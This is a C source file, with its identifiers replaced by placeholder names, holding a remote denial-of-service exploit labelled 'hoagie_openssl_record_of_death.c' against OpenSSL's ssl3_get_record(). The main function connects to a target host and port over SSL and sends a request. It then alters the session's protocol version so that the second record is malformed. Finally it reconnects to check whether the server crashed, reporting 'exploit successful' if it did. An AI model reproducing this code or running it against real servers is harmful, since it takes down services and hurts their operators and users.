
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_5__ TYPE_1__ ;


struct sockaddr_in {int dummy; } ;
struct hostent {int dummy; } ;
typedef int data ;
struct TYPE_5__ {int version; } ;
typedef TYPE_1__ SSL ;


 int VAR_0 ;
 int VAR_1 ;
 char VAR_2 ;
 int FUNC_0 (TYPE_1__*) ;
 int FUNC_1 (TYPE_1__*,char*,int ) ;
 int FUNC_2 (char*) ;
 int FUNC_3 (int) ;
 int FUNC_4 (char*,int) ;
 int FUNC_5 (int ,char*,...) ;
 char FUNC_6 (int,char**,char*) ;
 char* VAR_3 ;
 int FUNC_7 (int) ;
 int FUNC_8 (char*,int,char*) ;
 TYPE_1__* FUNC_9 (int) ;
 int VAR_4 ;
 int FUNC_10 (char*) ;
 int FUNC_11 (int,char**) ;

int FUNC_12(int VAR_5, char **VAR_6) {
   struct sockaddr_in VAR_7;
   struct hostent *VAR_8;
   char VAR_9[1024];

   int VAR_10;
   int VAR_11 = 0;
   char VAR_12;
   char *VAR_13 = ((void*)0);
   int VAR_14 = 0;
   SSL *VAR_15 = ((void*)0);

   FUNC_5(VAR_4,
           "hoagie_openssl_record_of_death.c - openssl ssl3_get_record() remote\n"
           "-andi / void.at\n\n");

   if (VAR_5 < 2) {
      FUNC_11(VAR_5, VAR_6);
   } else {
      while ((VAR_12 = FUNC_6 (VAR_5, VAR_6, "hd:p:t:")) != VAR_2) {
         switch (VAR_12) {
            case 'h':
                 FUNC_11(VAR_5, VAR_6);
                 break;
            case 'd':
                 VAR_13 = VAR_3;
                 break;
            case 'p':
                 VAR_14 = FUNC_2(VAR_3);
                 break;
            case 't':
                 VAR_11 = FUNC_2(VAR_3);
                 break;
         }
      }

      if (!VAR_13 || !VAR_14) {
         FUNC_5(VAR_4, "[*] destination and/or port missing\n");
      } else if (VAR_11 && VAR_11 != 1) {
         FUNC_5(VAR_4, "[*] invalid target '%d'\n", VAR_11);
      } else {
         VAR_10 = FUNC_4(VAR_13, VAR_14);
         if (VAR_10 > 0) {
            FUNC_5(VAR_4, "[+] tcp connection to '%s:%d' successful\n", VAR_13, VAR_14);
            VAR_15 = FUNC_9(VAR_10);
            if (VAR_15) {
               FUNC_5(VAR_4, "[+] ssl connection to '%s:%d' successful\n", VAR_13, VAR_14);
               FUNC_8(VAR_9, sizeof(VAR_9), "GET / HTTP/1.0\r\n\r\n");

               FUNC_5(VAR_4, "[+] sending first packet ...\n");
               FUNC_1(VAR_15, VAR_9, FUNC_10(VAR_9));

               if (!VAR_11) {
                  VAR_15->version = VAR_0;
               } else {
                  VAR_15->version = VAR_1;
               }

               FUNC_5(VAR_4, "[+] sending second paket ...\n");
               FUNC_1(VAR_15, VAR_9, FUNC_10(VAR_9));

               FUNC_0(VAR_15);
               FUNC_3(VAR_10);

               FUNC_7(1);

               VAR_10 = FUNC_4(VAR_13, VAR_14);
               if (VAR_10 > 0) {
                  FUNC_5(VAR_4, "[-] exploit failed\n");
                  FUNC_3(VAR_10);
               } else {
                  FUNC_5(VAR_4, "[+] exploit successful\n");
               }
            } else {
               FUNC_5(VAR_4, "[-] ssl connection to '%s:%d' failed\n", VAR_13, VAR_14);
            }
         } else {
            FUNC_5(VAR_4, "[-] tcp connection to '%s:%d' failed\n", VAR_13, VAR_14);
         }
      }
   }

   return 0;
}
